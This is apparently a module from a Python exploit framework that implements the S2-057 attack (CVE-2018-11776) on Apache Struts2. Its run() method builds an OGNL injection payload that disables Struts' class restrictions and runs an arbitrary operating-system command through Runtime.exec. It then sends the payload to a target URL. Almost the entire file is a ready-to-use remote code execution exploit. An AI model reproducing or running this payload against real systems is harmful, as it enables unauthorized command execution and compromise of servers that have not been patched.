#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit import exploits
from zerooosploit import color
import prettytable as pt
import requests
import re


class Exploit(exploits.ExploitAggregate):

    option = {
        'url': {'default': 'http://your-ip:8080/struts2-showcase/'},
        'command': {'default': 'id'}
    }

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'name': 'S2-057',
            'product': 'struts2',
            'authors': '01 Security Team',
            'references': 'https://cwiki.apache.org/confluence/display/WW/S2-057,\n'
                          'https://lgtm.com/blog/apache_struts_CVE-2018-11776,\n'
                          'https://xz.aliyun.com/t/2618,\n'
                          'https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg',
            'cve': 'CVE-2018-11776',
            'create_date': '2019-05-30'
        }

    def register_option(self, key, value):
        if key in self.option.keys():
            self.option[key]['default'] = value

    def get_options(self, key):
        return self.option[key]['default']

    def show_options(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.option.items():
            field_names.append(v)
            for x in k.values():
                add_row.append(x)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def show_info(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.info.items():
            field_names.append(v)
            add_row.append(k)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def run(self):
        url = self.get_options('url')
        command = self.get_options('command')
        payload = '${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(%s)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}' % command

        try:
            r = requests.get(url=url + '/' + payload, timeout=60)
            if r.status_code == 302:
                req = re.findall('Location: .*?', r.text)
                print(req)
                color.success_tips('s2-057')
        except:
            pass


def main():
    exploit = Exploit()
    exploit.run()

